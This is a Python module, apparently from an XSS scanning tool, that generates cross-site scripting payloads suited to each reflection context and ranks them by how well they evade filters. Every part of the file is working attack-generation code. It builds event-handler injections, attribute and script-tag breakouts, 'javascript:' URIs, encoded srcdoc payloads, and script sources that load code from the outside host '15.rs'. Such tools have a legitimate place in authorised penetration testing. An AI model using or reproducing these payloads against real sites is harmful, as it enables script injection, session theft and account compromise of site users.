from core.config import (
    xsschecker, badTags, fillings, eFillings, lFillings,
    jFillings, eventHandlers, tags, functions
)
from core.jsContexter import jsContexter
from core.utils import random_upper as r, gen_gen, extract_scripts


def generator(occurences, response):
    scripts = extract_scripts(response)
    script_index = 0

    # Payloads categorizados por pontuação de evasão
    vectors = {i: set() for i in range(1, 12)}

    for i, occurrence in occurences.items():
        ctx = occurrence['context']
        score = occurrence['score']
        details = occurrence['details']
        ends = ['//']

        if ctx == 'html':
            if score.get('>', 0) == 100:
                ends.append('>')
            if score.get('<', 0):
                badTag = details.get('badTag', '')
                payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, badTag)
                vectors[10].update(payloads)

        elif ctx == 'attribute':
            found = False
            tag = details['tag']
            attr_type = details['type']
            quote = details.get('quote', '')
            attr_name = details['name']
            attr_value = details['value']

            quote_score = score.get(quote, 100)
            bracket_score = score.get('>', 0)

            if bracket_score == 100:
                ends.append('>')

            if quote_score == 100 and bracket_score == 100:
                payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[9].add(f'{quote}>{payload}')
                    found = True

            if quote_score == 100:
                for f in fillings:
                    for func in functions:
                        vectors[8].add(f'{quote}{f}{r("autofocus")}{f}{r("onfocus")}={quote}{func}')
                        found = True

            if quote_score == 90:
                for f in fillings:
                    for func in functions:
                        vectors[7].add(f'\\{quote}{f}{r("autofocus")}{f}{r("onfocus")}={func}{f}\\{quote}')
                        found = True

            if attr_type == 'value':
                if attr_name == 'srcdoc' and score.get('&lt;', 0) and score.get('&gt;', 0):
                    ends = ['%26gt;']
                    payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                    vectors[9].update(p.replace('<', '%26lt;') for p in payloads)
                    found = True

                elif attr_name == 'href' and attr_value == xsschecker:
                    for func in functions:
                        vectors[10].add(f'{r("javascript:")}{func}')
                        found = True

                elif attr_name.startswith('on'):
                    closer = jsContexter(attr_value)
                    suffix = '//\\'
                    quote = next((c for c in attr_value.split(xsschecker)[1] if c in "'\"`"), '')
                    for f in jFillings:
                        for func in functions:
                            vector = f'{quote}{closer}{f}{func}{suffix}'
                            (vectors[7] if found else vectors[9]).add(vector)

                    if quote_score > 83:
                        suffix = '//'
                        for f in jFillings:
                            for func in functions:
                                if '=' in func:
                                    func = f'({func})'
                                f = f if quote else ''
                                vector = f'\\{quote}{closer}{f}{func}{suffix}'
                                (vectors[7] if found else vectors[9]).add(vector)

                elif tag in ('script', 'iframe', 'embed', 'object'):
                    if attr_name in ('src', 'iframe', 'embed') and attr_value == xsschecker:
                        vectors[10].update(['//15.rs', '\\/\\\\\\/\\15.rs'])
                        found = True

                    elif tag == 'object' and attr_name == 'data' and attr_value == xsschecker:
                        for func in functions:
                            vectors[10].add(f'{r("javascript:")}{func}')
                            found = True

                    elif quote_score == bracket_score == 100:
                        payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                        for p in payloads:
                            vectors[11].add(f'{quote}>{r("</script/>")}{p}')
                            found = True

        elif ctx == 'comment':
            if score.get('>', 0) == 100:
                ends.append('>')
            if score.get('<', 0) == 100:
                payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                vectors[10].update(payloads)

        elif ctx == 'script':
            script = scripts[script_index] if script_index < len(scripts) else scripts[0] if scripts else ''
            if not script:
                continue

            closer = jsContexter(script)
            quote = details.get('quote', '')
            script_score = score.get('</scRipT/>', 0)
            bracket_score = score.get('>', 0)
            breaker_score = score.get(quote, 100) if quote else 100

            if bracket_score == 100:
                ends.append('>')

            if script_score == 100:
                payloads = gen_gen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                vectors[10].update(payloads)

            if closer:
                for f in jFillings:
                    for func in functions:
                        vectors[7].add(f'{quote}{closer}{f}{func}//\\')
            elif breaker_score > 83:
                prefix = '' if breaker_score == 100 else '\\'
                for f in jFillings:
                    for func in functions:
                        if '=' in func:
                            func = f'({func})'
                        f = f if quote else ''
                        vectors[6].add(f'{prefix}{quote}{closer}{f}{func}//')

            script_index += 1

    return vectors
